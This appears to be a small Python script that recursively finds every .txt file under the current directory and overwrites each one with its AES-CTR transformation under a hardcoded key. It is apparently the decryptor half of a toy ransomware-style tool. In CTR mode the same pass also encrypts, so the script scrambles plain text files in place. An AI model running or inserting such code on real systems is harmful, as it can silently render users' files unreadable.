import os
from pathlib import Path
import pyaes

p = Path('.')

key = b"txtBlackHolexxxx"

for i in p.glob('**/*.txt'):
    with open(i, "rb") as file:
        file_data = file.read()

    aes = pyaes.AESModeOfOperationCTR(key)
    decrypto_data = aes.decrypt(file_data)

    with open(i, 'wb') as file:
        file.write(decrypto_data)
